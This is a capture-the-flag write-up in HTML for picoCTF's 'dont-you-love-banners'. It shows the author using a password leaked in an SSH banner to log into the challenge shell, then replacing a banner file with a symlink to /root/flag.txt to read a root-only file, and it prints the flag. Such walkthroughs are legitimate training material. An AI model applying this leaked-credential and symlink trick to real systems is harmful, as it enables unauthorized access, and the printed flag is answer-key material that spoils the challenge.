@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF dont-you-love-banners @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve dont-you-love-banners</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>dont-you-love-banners</h2>
+            <pre>Name: dont-you-love-banners
+Description: Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 61017. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 50103. From the above information abuse the machine and find the flag in the /root directory.
+Author: Loic Shema / syreal
+Tags: Medium, General Skills, picoCTF 2024, shell, browser_webshell_solvable
+Challenge from: picoCTF 2024
+Hints:
+1. Do you know about symlinks?
+2. Maybe some small password cracking or guessing</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to find it over on the root directory of the second NetCat connection, which we can enter with some critical information that has been leaked over on the first NetCat. We'll first connect to the first one of course, so that we can check out what information leaked to enter into the second one and somehow get the flag from root, so if we don't enter the second NetCat with root permissions then we'll have to find some other way to get the flag from root. So we'll connect to these two over on the solution part.</p>
+            <h2>Solution</h2>
+            <p>We'll connect to the first NetCat from the description to see what this leaked information is:</p>
+            <pre>shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 57392
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+^C</pre>
+            <p>Well, that's some very informative leaked information, we get what program is running the other NetCat, but also its password:</p>
+            <pre>shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 62316
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password?
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+DEFCON
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+player@challenge:~$ ls</pre>
+            <p>Some simple questions after the password, we get inside the shell! Let's check out what files are in here and see if we can access the flag:</p>
+            <pre>player@challenge:~$ ls
+banner  text
+
+player@challenge:~$ cat banner
+*************************************
+**************WELCOME****************
+*************************************
+
+player@challenge:~$ cat text	
+keep digging
+
+player@challenge:~$ find / -name "flag.txt" 2>/dev/null
+/root/flag.txt
+
+player@challenge:~$ cat /root/flag.txt
+cat: /root/flag.txt: Permission denied</pre>
+            <p>Okay, I see something very interesting here. If we look at the banner, it's the same one that is printed when we enter into this second NetCat, and the challenge title has banner in it, so what if we could somehow copy the flag into the filename of the banner, so that the next time we enter the NetCat, the flag is printed in the place of that banner? Well, there is something that we can try, symbolic links, which let you assign a link to another file, so for example, if we put a link from the flag to the banner, when it requests the contents of banner it'll instead get redirected to the flag file. So let's see if we can do this with our permissions, what we need to do first is delete the banner, then assign the flag to that same filename:</p>
+            <pre>player@challenge:~$ rm banner
+
+player@challenge:~$ ls
+text
+
+player@challenge:~$ ln -s /root/flag.txt banner
+
+player@challenge:~$ ls
+banner  text</pre>
+            <p>Perfect! We were able to replace the banner with a link to the flag, let's reconnect to see if it actually worked:</p>
+            <pre>player@challenge:~$ exit
+logout
+What is the top cyber security conference in the world?
+^C
+shukularuni@SHUKULAP:~$ nc tethys.picoctf.net 62316
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+
+what is the password?</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/437">https://play.picoctf.org/practice/challenge/437</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
